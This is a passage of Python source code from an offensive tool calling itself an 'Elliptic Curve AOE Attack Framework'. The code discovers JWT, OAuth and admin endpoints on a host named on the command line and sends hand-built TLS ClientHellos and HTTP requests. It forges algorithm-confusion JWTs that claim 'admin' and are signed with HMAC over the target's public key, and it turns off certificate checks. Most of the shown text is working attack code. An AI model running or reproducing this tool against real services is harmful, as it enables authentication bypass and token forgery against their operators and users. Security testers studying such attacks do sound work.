        ext_list += u16(10) + u16(len(groups_vec)) + groups_vec
        # signature_algorithms (13) - RFC 8446 recommended set
        sigalgs = (
            b"\x04\x03"  # ecdsa_secp256r1_sha256
            b"\x05\x03"  # ecdsa_secp384r1_sha384
            b"\x06\x03"  # ecdsa_secp521r1_sha512
            b"\x08\x04"  # rsa_pss_rsae_sha256
            b"\x08\x05"  # rsa_pss_rsae_sha384
            b"\x08\x06"  # rsa_pss_rsae_sha512
            b"\x08\x07"  # ed25519
            b"\x08\x08"  # ed448
        )
        sigalgs_vec = u16(len(sigalgs)) + sigalgs
        ext_list += u16(13) + u16(len(sigalgs_vec)) + sigalgs_vec
        # signature_algorithms_cert (50) mirrors the same
        sigalgs_cert_vec = u16(len(sigalgs)) + sigalgs
        ext_list += u16(50) + u16(len(sigalgs_cert_vec)) + sigalgs_cert_vec
        # psk_key_exchange_modes (45)
        modes = b"\x01"  # psk_dhe_ke
        modes_vec = u8(len(modes)) + modes
        ext_list += u16(45) + u16(len(modes_vec)) + modes_vec
        # key_share (51)
        ks_entries = b""
        for group_id, ke in keyshare_entries:
            ks_entries += u16(group_id) + u16(len(ke)) + ke
        ks_vec = u16(len(ks_entries)) + ks_entries
        ext_list += u16(51) + u16(len(ks_vec)) + ks_vec

        extensions_block = u16(len(ext_list)) + ext_list

        ch_body = (
            legacy_version +
            random +
            u8(len(session_id)) + session_id +
            cipher_vec +
            comp_methods +
            extensions_block
        )
        ch = b"\x01" + u24(len(ch_body)) + ch_body  # HandshakeType client_hello = 1
        # TLS record
        content_type = b"\x16"  # handshake
        record_version = b"\x03\x03"
        record = content_type + record_version + u16(len(ch)) + ch
        return record
    
    def _create_mtls_payload(self, vector: AttackVector) -> bytes:
        """For mTLS, we still issue an HTTP request; cert manipulation occurs at TLS context setup (not here)."""
        request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: ec-aoe\r\nAccept: */*\r\nConnection: close\r\n\r\n"
        return request.encode()
    
    def _create_api_gateway_payload(self, vector: AttackVector) -> bytes:
        """Send a JSON POST; signature anomalies are evaluated server-side during auth."""
        body = '{"admin_action":"get_sensitive_data"}'
        request = (
            f"POST /api/v1/admin HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
            f"{body}"
        )
        return request.encode()
    
    def _create_oauth_payload(self, vector: AttackVector) -> bytes:
        """Build a standards-compliant OAuth client_credentials request body (x-www-form-urlencoded)."""
        body = "grant_type=client_credentials&client_id=ec-aoe&client_secret=ec-aoe"
        return body.encode()
    
    # Protocol communication methods
    
    async def _send_protocol_request(self, payload: bytes, endpoint: str, protocol: str) -> Dict[str, Any]:
        """Send request using appropriate protocol"""
        try:
            if protocol in ['tls', 'mtls']:
                return await self._send_tls_request(payload, endpoint)
            elif protocol in ['jwt', 'api_gateway', 'oauth']:
                return await self._send_http_request(payload, endpoint, protocol)
            else:
                return await self._send_generic_request(payload, endpoint)
                
        except Exception as e:
            return {
                'status_code': 0,
                'error': str(e),
                'body': b''
            }
    
    async def _send_tls_request(self, payload: bytes, endpoint: str) -> Dict[str, Any]:
        """Perform a raw TLS record write of ClientHello and read server response."""
        try:
            loop = asyncio.get_event_loop()
            reader, writer = await asyncio.open_connection(self.target_host, self.target_port)
            request_dump = payload
            writer.write(payload)
            await writer.drain()
            header = await asyncio.wait_for(reader.read(5), timeout=self.timeout)
            data = b""
            alert = None
            content_type_byte = None
            if len(header) == 5:
                content_type_byte = header[0]
                rec_len = struct.pack('>5s', header)  # placeholder avoid linter
                ln = struct.unpack('>H', header[3:5])[0]
                body = await asyncio.wait_for(reader.read(ln), timeout=self.timeout)
                data = header + body
                if content_type_byte == 21 and len(body) >= 2:
                    level, desc = body[0], body[1]
                    alert = {'level': int(level), 'description': int(desc)}
            writer.close()
            await writer.wait_closed()
            # Derive status
            if content_type_byte == 21:
                status = 495  # TLS alert
            elif content_type_byte == 22:
                status = 101  # handshake continued
            else:
                status = 0 if not data else 100
            resp = {'status_code': status, 'body': data, 'protocol': 'tls'}
            if alert:
                resp['tls_alert'] = alert
            # Attach dumps (base64-encoded)
            try:
                resp['request_dump_b64'] = base64.b64encode(request_dump).decode()
                resp['response_dump_b64'] = base64.b64encode(data or b'').decode()
            except Exception:
                pass
            return resp
        except Exception as e:
            return {'status_code': 0, 'error': str(e), 'body': b''}
    
    async def _send_http_request(self, payload: bytes, endpoint: str, protocol: str) -> Dict[str, Any]:
        """Send HTTP request with EC attack payload"""
        try:
            # Build HTTP request
            if protocol == 'jwt':
                request = f"GET {endpoint} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += f"Authorization: Bearer {payload.decode()}\r\n"
            elif protocol == 'api_gateway':
                request = payload.decode()
            elif protocol == 'oauth':
                request = f"POST /oauth/token HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"Content-Length: {len(payload)}\r\n"
                request += f"\r\n{payload.decode()}"
            else:
                request = f"POST {endpoint} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += f"Content-Length: {len(payload)}\r\n"
                request += f"\r\n"
                
            request_bytes = request.encode() if isinstance(request, str) else request
            if not isinstance(request, str):
                request_bytes += payload
            
            # Send via HTTPS with SNI and optional client certs
            context = self._build_ssl_context()
            reader, writer = await asyncio.open_connection(self.target_host, self.target_port, ssl=context, server_hostname=self.target_host)
            
            writer.write(request_bytes)
            await writer.drain()
            
            # Read response
            response_data = await asyncio.wait_for(reader.read(16384), timeout=self.timeout)
            
            writer.close()
            await writer.wait_closed()
            
            # Parse HTTP response
            response_text = response_data.decode('utf-8', errors='ignore')
            status_code = self._extract_http_status(response_text)
            # Gateway detection via Server header
            server_header = None
            for line in response_text.splitlines():
                if line.lower().startswith('server:'):
                    server_header = line.split(':', 1)[1].strip()
                    break
            if server_header:
                self.library_fingerprints.setdefault('http', {})['server'] = server_header
            
            resp = {
                'status_code': status_code,
                'body': response_data,
                'response_text': response_text,
                'protocol': protocol
            }
            try:
                resp['request_dump_b64'] = base64.b64encode(request_bytes).decode()
                resp['response_dump_b64'] = base64.b64encode(response_data or b'').decode()
            except Exception:
                pass
            return resp
            
        except Exception as e:
            return {
                'status_code': 0,
                'error': str(e),
                'body': b''
            }
    
    async def _send_generic_request(self, payload: bytes, endpoint: str) -> Dict[str, Any]:
        """Send generic request"""
        return await self._send_http_request(payload, endpoint, 'generic')
    
    # Discovery methods
    
    async def _discover_protocol_endpoints(self, protocol: str) -> Dict[str, Any]:
        """Discover endpoints for specific protocol"""
        endpoints = []
        
        if protocol == 'jwt':
            # Common JWT endpoints
            jwt_endpoints = [
                '/auth/verify',
                '/api/verify-token', 
                '/jwt/validate',
                '/.well-known/jwks.json',
                '/oauth/userinfo'
            ]
            
            for endpoint in jwt_endpoints:
                if await self._test_endpoint_availability(endpoint):
                    endpoints.append(endpoint)
                    
        elif protocol == 'tls':
            # TLS is tested via direct connection
            endpoints = ['tls_handshake']
            
        elif protocol == 'api_gateway':
            # Common API Gateway patterns
            gateway_endpoints = [
                '/api/v1/admin',
                '/api/authenticate',
                '/gateway/verify',
                '/admin/api'
            ]
            
            for endpoint in gateway_endpoints:
                if await self._test_endpoint_availability(endpoint):
                    endpoints.append(endpoint)
        elif protocol == 'oauth':
            # OIDC discovery and common token endpoints
            oidc = '/.well-known/openid-configuration'
            if await self._test_endpoint_availability(oidc):
                endpoints.append(oidc)
                try:
                    doc = await self._http_get_json(oidc)
                    if 'jwks_uri' in doc:
                        jwks_path = self._extract_path_from_url(doc['jwks_uri'])
                        if await self._test_endpoint_availability(jwks_path):
                            endpoints.append(jwks_path)
                            await self._fetch_and_store_jwks(jwks_path)
                    if 'token_endpoint' in doc:
                        token_path = self._extract_path_from_url(doc['token_endpoint'])
                        if await self._test_endpoint_availability(token_path):
                            endpoints.append(token_path)
                except Exception:
                    pass
            # Common defaults
            for ep in ['/oauth/token', '/token', '/connect/token', '/.well-known/jwks.json']:
                if await self._test_endpoint_availability(ep):
                    endpoints.append(ep)
        
        # Other protocols: extend here with concrete discovery only
        
        return {
            'protocol': protocol,
            'endpoints': endpoints,
            'supported': len(endpoints) > 0
        }
    
    async def _test_endpoint_availability(self, endpoint: str) -> bool:
        """Test if endpoint is available"""
        try:
            context = self._build_ssl_context()
            reader, writer = await asyncio.open_connection(self.target_host, self.target_port, ssl=context, server_hostname=self.target_host)
            
            request = f"HEAD {endpoint} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=5.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            # Consider available if not 404
            return '404' not in response_text
            
        except Exception:
            return False
    
    def _get_protocol_endpoints(self, protocol: str) -> List[str]:
        """Get discovered endpoints for protocol"""
        # Return relevant endpoints from discovered_endpoints
        if protocol == 'jwt':
            return [ep for ep in self.discovered_endpoints if any(
                jwt_path in ep for jwt_path in ['jwt', 'auth', 'token', 'oauth']
            )]
        elif protocol == 'tls':
            return ['tls_handshake']
        elif protocol == 'api_gateway':
            return [ep for ep in self.discovered_endpoints if any(
                api_path in ep for api_path in ['api', 'gateway', 'admin']
            )]
        elif protocol == 'oauth':
            return [ep for ep in self.discovered_endpoints if any(x in ep for x in ['.well-known', 'jwks', 'token'])]
        else:
            return list(self.discovered_endpoints)
    
    # Analysis methods
    
    def _analyze_anomaly_acceptance(self, response: Dict, vector: AttackVector) -> bool:
        """Analyze if anomalous EC data was accepted"""
        status_code = response.get('status_code', 0)
        
        # Check if request was accepted despite anomaly
        if status_code in [200, 201, 202, 204]:
            return True
        
        # Check for specific error patterns that indicate processing
        body = response.get('body', b'')
        if isinstance(body, bytes):
            body_text = body.decode('utf-8', errors='ignore').lower()
            
            # If we get cryptographic errors rather than HTTP errors,
            # it means the payload was processed
            crypto_error_indicators = [
                'invalid signature', 'verification failed', 'bad signature',
                'point not on curve', 'invalid key', 'crypto error'
            ]
            
            for indicator in crypto_error_indicators:
                if indicator in body_text:
                    return True
        
        return False
    
    def _detect_vulnerability(self, response: Dict, vector: AttackVector, protocol: str) -> bool:
        """Detect if response indicates vulnerability"""
        # High severity indicators
        if vector.severity == 'CRITICAL':
            return response.get('status_code', 0) in [200, 201, 204]
        
        # Check for specific vulnerability patterns
        body = response.get('body', b'')
        if isinstance(body, bytes):
            body_text = body.decode('utf-8', errors='ignore').lower()
            
            vulnerability_indicators = [
                'authenticated', 'authorized', 'admin', 'success',
                'valid signature', 'signature verified', 'access granted'
            ]
            
            for indicator in vulnerability_indicators:
                if indicator in body_text:
                    return True
        
        # Protocol-specific vulnerability detection
        if protocol == 'jwt':
            # JWT should never accept invalid signatures
            return response.get('status_code') == 200 and vector.anomaly_type in ['invalid_point', 'high_s_signature']
        elif protocol == 'tls':
            # TLS should reject invalid curve points
            return vector.anomaly_type == 'invalid_point' and response.get('status_code') > 0
        
        return False
    
    def _extract_evidence(self, response: Dict, vector: AttackVector) -> List[str]:
        """Extract vulnerability evidence"""
        evidence = []
        
        status_code = response.get('status_code', 0)
        if status_code:
            evidence.append(f"HTTP Status: {status_code}")
        
        # Check response body for evidence
        body = response.get('body', b'')
        if isinstance(body, bytes) and len(body) > 0:
            body_preview = body[:200].decode('utf-8', errors='ignore')
            if any(keyword in body_preview.lower() for keyword in ['error', 'invalid', 'success', 'verified']):
                evidence.append(f"Response preview: {body_preview[:100]}")
        
        # Add vector-specific evidence
        evidence.append(f"Anomaly type: {vector.anomaly_type}")
        evidence.append(f"Curve: {vector.curve.value}")
        evidence.append(f"Payload size: {len(vector.payload)} bytes")
        
        return evidence
    
    def _identify_library_from_response(self, response: Dict) -> Optional[str]:
        """Identify crypto library from response patterns"""
        if not FP_AVAILABLE:
            body = response.get('body', b'')
            if not isinstance(body, bytes):
                return None
            body_text = body.decode('utf-8', errors='ignore').lower()
            for library, patterns in {
                'openssl': ['openssl', 'ssl routines', 'evp_'],
                'boringssl': ['boringssl', 'boring'],
                'bouncy_castle': ['bouncy', 'castle', 'bc-'],
                'go_crypto': ['crypto/elliptic', 'go runtime'],
                'mbedtls': ['mbedtls', 'polarssl'],
                'wolfssl': ['wolfssl', 'wolfcrypt'],
                'libgcrypt': ['libgcrypt', 'gcrypt'],
                'nss': ['network security services', 'nss']
            }.items():
                if any(pattern in body_text for pattern in patterns):
                    return library
            return None
        # Use external fingerprint module if available
        try:
            fp = fp_proxy.run_http_fp(self.target_host, self.target_port, timeout=min(self.timeout, 5.0))
            if fp:
                self.library_fingerprints['behavior_fp'] = fp
        except Exception:
            pass
        return None

    async def _http_get_json(self, path: str) -> Dict[str, Any]:
        context = self._build_ssl_context()
        reader, writer = await asyncio.open_connection(self.target_host, self.target_port, ssl=context, server_hostname=self.target_host)
        req = f"GET {path} HTTP/1.1\r\nHost: {self.target_host}\r\nAccept: application/json\r\nConnection: close\r\n\r\n".encode()
        writer.write(req)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(16384), timeout=self.timeout)
        writer.close()
        await writer.wait_closed()
        text = data.decode('utf-8', errors='ignore')
        body = text.split('\r\n\r\n', 1)[-1]
        return json.loads(body)

    def _extract_path_from_url(self, url: str) -> str:
        try:
            if '://' in url:
                return '/' + url.split('://', 1)[1].split('/', 1)[1]
            return url if url.startswith('/') else '/' + url
        except Exception:
            return '/'

    async def _fetch_and_store_jwks(self, jwks_path: str) -> None:
        try:
            doc = await self._http_get_json(jwks_path)
            if isinstance(doc, dict) and 'keys' in doc:
                self.jwks = doc
        except Exception:
            pass

    def _build_ssl_context(self) -> ssl.SSLContext:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        if self.client_cert_path and self.client_key_path:
            try:
                context.load_cert_chain(self.client_cert_path, self.client_key_path)
            except Exception:
                pass
        return context
    
    def _calculate_severity(self, result: AttackResult) -> str:
        """Calculate vulnerability severity"""
        if result.target_protocol in ['jwt', 'oauth'] and result.anomaly_accepted:
            return 'CRITICAL'
        elif result.target_protocol in ['tls', 'mtls'] and result.vulnerability_detected:
            return 'HIGH' 
        elif result.anomaly_accepted:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _get_vulnerability_impact(self, result: AttackResult) -> str:
        """Get vulnerability impact description"""
        impacts = {
            'jwt': 'Authentication bypass, token forgery',
            'tls': 'Certificate validation bypass, MitM attacks',
            'mtls': 'Client authentication bypass',
            'api_gateway': 'API access control bypass',
            'oauth': 'Authorization bypass, token manipulation'
        }
        
        base_impact = impacts.get(result.target_protocol, 'Cryptographic validation bypass')
        
        if result.curve in ['secp256k1']:
            base_impact += ', blockchain transaction manipulation'
        
        return base_impact
    
    # Fingerprinting and testing methods
    
    def _create_openssl_fingerprint_payload(self) -> bytes:
        # Use a compressed SEC1 point header with zero x to trigger specific parsing paths
        return b'\x02' + b'\x00' * 32
    
    def _create_bouncycastle_fingerprint_payload(self) -> bytes:
        # Minimal DER with non-canonical integer length (long form with leading zero)
        return b'\x30\x81\x06' + b'\x02\x01\x01' + b'\x02\x01\x01'
    
    def _create_golang_fingerprint_payload(self) -> bytes:
        # Compressed point with max x to trigger edge-case validation
        return b'\x02' + b'\xff' * 32
    
    async def _execute_fingerprinting_test(self, vector: Dict) -> Dict[str, Any]:
        """This tool performs concrete TLS/HTTP fingerprinting only; per-vector mocks removed."""
        return {'test': vector.get('name', ''), 'executed': False}
    
    async def _execute_jwt_ec_test(self, scenario: Dict) -> Dict[str, Any]:
        """Execute JWT attack per scenario, including algorithm confusion (ES/RS->HS)."""
        endpoints = [ep for ep in self.discovered_endpoints if 'jwt' in ep or 'auth' in ep or 'token' in ep]
        if not endpoints:
            return {'scenario': scenario['name'], 'executed': False, 'vulnerability_detected': False, 'evidence': ['no_endpoint']}
        try:
            scen = scenario.get('name', '')
            if scen in ['jwt_algorithm_confusion', 'algorithm_substitution']:
                token = self._create_alg_confusion_jwt()
            else:
                token = self._create_jwt_payload(AttackVector(name='jwt_probe', curve=CurveType.P256, anomaly_type='none', description='', payload=b'', expected_behavior='', severity='LOW'))
            resp = await self._send_http_request(token, endpoints[0], 'jwt')
            ev = [f"status={resp.get('status_code')}"]
            if 'response_dump_b64' in resp:
                ev.append('resp_dump_present')
            return {'scenario': scenario['name'], 'executed': True, 'vulnerability_detected': resp.get('status_code') == 200, 'evidence': ev}
        except Exception as e:
            return {'scenario': scenario['name'], 'executed': True, 'vulnerability_detected': False, 'evidence': [str(e)]}
    
    async def _execute_tls_ec_test(self, scenario: Dict) -> Dict[str, Any]:
        """Perform a real TLS handshake and report connection success; detailed EC manipulation is out-of-scope here."""
        try:
            resp = await self._send_tls_request(self._create_tls_payload(AttackVector(name='tls_probe', curve=CurveType.P256, anomaly_type='none', description='', payload=b'', expected_behavior='', severity='LOW')), 'tls_handshake')
            return {'scenario': scenario['name'], 'executed': True, 'vulnerability_detected': resp.get('status_code', 0) > 0, 'evidence': [f"tls={resp.get('status_code')}"]}
        except Exception as e:
            return {'scenario': scenario['name'], 'executed': True, 'vulnerability_detected': False, 'evidence': [str(e)]}
    
    async def _execute_arithmetic_attack(self, attack_type: str) -> Dict[str, Any]:
        return {'attack_type': attack_type, 'vulnerabilities': []}
    
    # Utility methods
    
    def _extract_http_status(self, response_text: str) -> int:
        """Extract HTTP status code from response"""
        try:
            if response_text.startswith('HTTP/'):
                parts = response_text.split(' ', 2)
                if len(parts) >= 2:
                    return int(parts[1])
        except:
            pass
        return 0

    def _verify_jwt_with_jwks(self, token: str) -> bool:
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False
            # Proper JOSE base64url decode (padless)
            def b64u(s: str) -> bytes:
                pad = '=' * (-len(s) % 4)
                return base64.urlsafe_b64decode(s + pad)
            header = json.loads(b64u(parts[0]))
            kid = header.get('kid')
            alg = header.get('alg')
            if not self.jwks or 'keys' not in self.jwks:
                return False
            # Strict match by kid first when provided
            keys = self.jwks['keys']
            candidates = [k for k in keys if (not kid or k.get('kid') == kid)]
            # Enforce alg/kty/crv compatibility
            def hash_for_alg(a: str):
                return {
                    'ES256': hashes.SHA256(),
                    'ES384': hashes.SHA384(),
                    'ES512': hashes.SHA512(),
                    'RS256': hashes.SHA256(),
                    'EdDSA': None,
                }.get(a)
            digest = hash_for_alg(alg)
            if alg not in ['ES256', 'ES384', 'ES512', 'RS256', 'EdDSA']:
                return False
            signing_input = (parts[0] + '.' + parts[1]).encode()
            sig_bytes = b64u(parts[2])
            for k in candidates:
                kty = k.get('kty')
                try:
                    if kty == 'EC' and alg in ['ES256', 'ES384', 'ES512']:
                        if not CRYPTO_AVAILABLE:
                            return False
                        crv = k.get('crv')
                        curve = {'P-256': ec.SECP256R1(), 'P-384': ec.SECP384R1(), 'P-521': ec.SECP521R1()}.get(crv)
                        if not curve:
                            continue
                        x = int.from_bytes(b64u(k['x']), 'big')
                        y = int.from_bytes(b64u(k['y']), 'big')
                        pub = ec.EllipticCurvePublicNumbers(x, y, curve).public_key()
                        bl = (curve.key_size + 7) // 8
                        if len(sig_bytes) != 2 * bl:
                            continue
                        r = int.from_bytes(sig_bytes[:bl], 'big')
                        s = int.from_bytes(sig_bytes[bl:], 'big')
                        from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature
                        der = encode_dss_signature(r, s)
                        pub.verify(der, signing_input, ec.ECDSA(digest))
                        return True
                    if kty == 'OKP' and alg == 'EdDSA' and k.get('crv') == 'Ed25519':
                        if not CRYPTO_AVAILABLE:
                            return False
                        x = b64u(k['x'])
                        pub = ed25519.Ed25519PublicKey.from_public_bytes(x)
                        pub.verify(sig_bytes, signing_input)
                        return True
                    if kty == 'RSA' and alg == 'RS256':
                        if not CRYPTO_AVAILABLE:
                            return False
                        n = int.from_bytes(b64u(k['n']), 'big')
                        e = int.from_bytes(b64u(k['e']), 'big')
                        pub = rsa.RSAPublicNumbers(e, n).public_key()
                        pub.verify(sig_bytes, signing_input, asym_padding.PKCS1v15(), digest)
                        return True
                except Exception:
                    continue
            return False
        except Exception:
            return False
    
    def compile_attack_statistics(self) -> Dict[str, Any]:
        """Compile comprehensive attack statistics"""
        stats = self.attack_stats.copy()
        
        stats['success_rates'] = {
            'overall': stats['successful_attacks'] / max(stats['total_attacks'], 1),
            'anomaly_acceptance': stats['anomalies_accepted'] / max(stats['total_attacks'], 1)
        }
        
        stats['curve_coverage'] = {
            curve.value: len([v for v in self.attack_vectors if v.curve == curve])
            for curve in CURVE_REGISTRY.keys()
        }
        
        return stats
    
    def _analyze_vulnerabilities(self, results: Dict[str, Any]):
        """Analyze and categorize discovered vulnerabilities"""
        all_vulnerabilities = []
        
        # Collect vulnerabilities from all attack phases
        for attack_type, attack_results in results['attacks'].items():
            if isinstance(attack_results, dict) and 'vulnerabilities' in attack_results:
                all_vulnerabilities.extend(attack_results['vulnerabilities'])
        
        # Categorize by severity and type
        results['vulnerabilities'] = all_vulnerabilities
        results['vulnerability_summary'] = {
            'total': len(all_vulnerabilities),
            'by_severity': {
                'critical': len([v for v in all_vulnerabilities if v.get('severity') == 'CRITICAL']),
                'high': len([v for v in all_vulnerabilities if v.get('severity') == 'HIGH']),
                'medium': len([v for v in all_vulnerabilities if v.get('severity') == 'MEDIUM']),
                'low': len([v for v in all_vulnerabilities if v.get('severity') == 'LOW'])
            },
            'by_curve': {},
            'by_protocol': {}
        }
        
        # Group by curve and protocol
        for vuln in all_vulnerabilities:
            curve = vuln.get('curve', 'unknown')
            protocol = vuln.get('protocol', 'unknown')
            
            if curve not in results['vulnerability_summary']['by_curve']:
                results['vulnerability_summary']['by_curve'][curve] = 0
            results['vulnerability_summary']['by_curve'][curve] += 1
            
            if protocol not in results['vulnerability_summary']['by_protocol']:
                results['vulnerability_summary']['by_protocol'][protocol] = 0  
            results['vulnerability_summary']['by_protocol'][protocol] += 1
        
        # Overall risk assessment
        critical_count = results['vulnerability_summary']['by_severity']['critical']
        high_count = results['vulnerability_summary']['by_severity']['high']
        
        if critical_count > 0:
            results['risk_level'] = 'CRITICAL'
        elif high_count > 0:
            results['risk_level'] = 'HIGH'
        elif results['vulnerability_summary']['total'] > 0:
            results['risk_level'] = 'MEDIUM'
        else:
            results['risk_level'] = 'LOW'

    def _create_alg_confusion_jwt(self, custom_claims: Optional[Dict[str, Any]] = None) -> Optional[bytes]:
        """Create a JWT with alg=HS256 but HMAC key set to a public key (ES/RS), to test algorithm confusion.
        Returns token bytes if built, else None.
        """
        try:
            if not self.jwks or 'keys' not in self.jwks:
                return None
            # Select a key from JWKS to misuse as HMAC secret
            key = None
            for k in self.jwks['keys']:
                if k.get('kty') in ['EC', 'RSA']:
                    key = k
                    break
            if not key:
                return None
            kid = key.get('kid')
            header = {'alg': 'HS256', 'typ': 'JWT'}
            if kid:
                header['kid'] = kid
            now = int(time.time())
            claims = custom_claims or {
                'sub': 'admin', 'iat': now, 'exp': now + 600
            }
            h_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
            p_b64 = base64.urlsafe_b64encode(json.dumps(claims, separators=(',', ':')).encode()).decode().rstrip('=')
            signing_input = f"{h_b64}.{p_b64}".encode()
            # Build HMAC key from public key parameters
            def b64u_bytes(s: str) -> bytes:
                pad = '=' * (-len(s) % 4)
                return base64.urlsafe_b64decode(s + pad)
            candidates: List[bytes] = []
            if key.get('kty') == 'EC':
                x = b64u_bytes(key['x']); y = b64u_bytes(key['y'])
                candidates.append(b'\x04' + x + y)  # uncompressed SEC1
                # JWK JSON bytes
                candidates.append(json.dumps(key, separators=(',', ':')).encode())
            else:  # RSA
                n = b64u_bytes(key['n']); e = b64u_bytes(key['e'])
                candidates.append(n + e)
                candidates.append(json.dumps(key, separators=(',', ':')).encode())
            sig = None
            for secret in candidates:
                sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
                if sig:
                    break
            s_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
            return f"{h_b64}.{p_b64}.{s_b64}".encode()
        except Exception:
            return None

# Utility Functions
def format_results_json(results: Dict[str, Any]) -> str:
    """Format results as JSON"""
    return json.dumps(results, indent=2, default=str)

def format_results_report(results: Dict[str, Any]) -> str:
    """Format results as comprehensive report"""
    report = []
    report.append("="*80)
    report.append("ELLIPTIC CURVE AOE (AREA OF EFFECT) VULNERABILITY ASSESSMENT")
    report.append("="*80)
    
    report.append(f"\nTarget: {results.get('target')}")
    report.append(f"Assessment Time: {results.get('timestamp')}")
    report.append(f"Duration: {results.get('metadata', {}).get('assessment_duration', 0):.2f}s")
    
    # Curves and protocols tested
    report.append(f"\nCurves Tested: {', '.join(results.get('curves_tested', []))}")
    report.append(f"Protocols Tested: {', '.join(results.get('protocols_tested', []))}")
    report.append(f"Total Attack Vectors: {results.get('metadata', {}).get('total_vectors', 0)}")
    
    # Vulnerability Summary
    vuln_summary = results.get('vulnerability_summary', {})
    report.append(f"\n VULNERABILITY SUMMARY:")
    report.append(f"   Total Vulnerabilities: {vuln_summary.get('total', 0)}")
    by_severity = vuln_summary.get('by_severity', {})
    report.append(f"   Critical: {by_severity.get('critical', 0)}")
    report.append(f"   High: {by_severity.get('high', 0)}")
    report.append(f"   Medium: {by_severity.get('medium', 0)}")
    report.append(f"   Risk Level: {results.get('risk_level', 'UNKNOWN')}")
    
    # Curve-specific vulnerabilities
    by_curve = vuln_summary.get('by_curve', {})
    if by_curve:
        report.append(f"\n VULNERABILITIES BY CURVE:")
        for curve, count in by_curve.items():
            report.append(f"   {curve}: {count}")
    
    # Protocol-specific vulnerabilities  
    by_protocol = vuln_summary.get('by_protocol', {})
    if by_protocol:
        report.append(f"\n VULNERABILITIES BY PROTOCOL:")
        for protocol, count in by_protocol.items():
            report.append(f"   {protocol}: {count}")
    
    # Library fingerprints
    if results.get('library_fingerprints'):
        report.append(f"\n LIBRARY FINGERPRINTS:")
        for library, fingerprint in results['library_fingerprints'].items():
            report.append(f"   {library}: {fingerprint.get('confidence', 'unknown')} confidence")
    
    # Detailed vulnerabilities
    if results.get('vulnerabilities'):
        report.append(f"\n DETAILED VULNERABILITIES:")
        for i, vuln in enumerate(results['vulnerabilities'][:10], 1):  # Show top 10
            report.append(f"\n   {i}. [{vuln['severity']}] {vuln['type']}")
            report.append(f"      Description: {vuln.get('description', 'N/A')}")
            report.append(f"      Impact: {vuln['impact']}")
            if vuln.get('evidence'):
                evidence_preview = ', '.join(vuln['evidence'][:2])
                report.append(f"      Evidence: {evidence_preview}")
    
    # Attack statistics
    stats = results.get('statistics', {})
    if stats:
        report.append(f"\n ATTACK STATISTICS:")
        report.append(f"   Total Attacks: {stats.get('total_attacks', 0)}")
        report.append(f"   Successful Attacks: {stats.get('successful_attacks', 0)}")
        report.append(f"   Anomalies Accepted: {stats.get('anomalies_accepted', 0)}")
        report.append(f"   Libraries Fingerprinted: {stats.get('libraries_fingerprinted', 0)}")
        
        success_rates = stats.get('success_rates', {})
        report.append(f"   Overall Success Rate: {success_rates.get('overall', 0):.2%}")
        report.append(f"   Anomaly Acceptance Rate: {success_rates.get('anomaly_acceptance', 0):.2%}")
    
    return '\n'.join(report)

async def main():
    """Enhanced main function with comprehensive CLI"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Advanced Elliptic Curve AOE Attack Framework v5.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s api.example.com
  %(prog)s jwt.service.com --protocols jwt oauth --timeout 15
  %(prog)s target.com --output assessment.json --format json  
  %(prog)s crypto.service --protocols tls mtls jwt --verbose
        """
    )
    
    parser.add_argument('host', help='Target hostname or IP address')
    parser.add_argument('--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('--protocols', nargs='+', 
                       choices=['tls', 'jwt', 'mtls', 'api_gateway', 'oauth'],
                       default=['tls', 'jwt', 'api_gateway', 'oauth'],
                       help='Protocols to test (default: all)')
    parser.add_argument('--curves', nargs='+',
                       choices=[curve.value for curve in CurveType],
                       help='Specific curves to test (default: all)')
    parser.add_argument('--timeout', type=float, default=10.0, help='Connection timeout (default: 10.0)')
    parser.add_argument('--client-cert', help='Path to client certificate (PEM) for mTLS')
    parser.add_argument('--client-key', help='Path to client private key (PEM) for mTLS')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--format', choices=['json', 'report'], default='report', help='Output format (default: report)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    parser.add_argument('--parallel', type=int, default=10, help='Parallel request limit (default: 10)')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    
    print(f" Elliptic Curve AOE Attack Framework v5.0")
    print(f" Target: {args.host}:{args.port}")
    print(f" Protocols: {', '.join(args.protocols)}")
    print(f" Curves: {', '.join(args.curves) if args.curves else 'All supported curves'}")
    print(f"  Configuration: timeout={args.timeout}s, parallel={args.parallel}")
    print()
    
    if not CRYPTO_AVAILABLE:
        print("️  Warning: Cryptography library not available - cryptographic operations will be limited")
        print()
    
    # Create attack framework
    attacker = EllipticCurveAOE(
        target_host=args.host,
        target_port=args.port,
        timeout=args.timeout,
        client_cert_path=args.client_cert,
        client_key_path=args.client_key
    )
    
    # Filter curves if specified
    if args.curves:
        curve_types = [CurveType(curve) for curve in args.curves]
        # Filter attack vectors to only include specified curves
        attacker.attack_vectors = [v for v in attacker.attack_vectors if v.curve in curve_types]
        logger.info(f"Filtered to {len(attacker.attack_vectors)} vectors for specified curves")
    
    try:
        # Run comprehensive assessment
        results = await attacker.run_comprehensive_assessment(args.protocols)
        
        # Format output
        if args.format == 'json':
